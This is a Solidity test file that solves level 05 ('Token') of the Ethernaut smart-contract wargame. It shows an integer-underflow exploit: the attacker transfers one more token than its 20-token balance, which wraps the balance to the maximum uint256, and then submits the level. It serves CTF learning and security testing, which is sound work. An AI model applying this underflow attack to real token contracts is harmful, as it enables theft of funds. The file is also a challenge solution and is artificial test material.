pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/05-Token/TokenFactory.sol';
import '../core/Ethernaut.sol';

contract TokenTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);
  address otherWallet = address(0xfaceface);
  uint256 MAX_INT = 2**256 - 1;

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testTokenHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    TokenFactory tokenFactory = new TokenFactory();
    ethernaut.registerLevel(tokenFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(tokenFactory);
    Token tokenContract = Token(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    
    uint256 attackerBalanceBefore = tokenContract.balanceOf(attacker);    
    // check balance for player is correct
    assertEq(attackerBalanceBefore, 20);
    // transfer MORE than our balance to a randomer
    tokenContract.transfer(otherWallet, attackerBalanceBefore + 1);

    uint256 attackerBalanceAfter = tokenContract.balanceOf(attacker);    
    assertEq(attackerBalanceAfter, MAX_INT);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}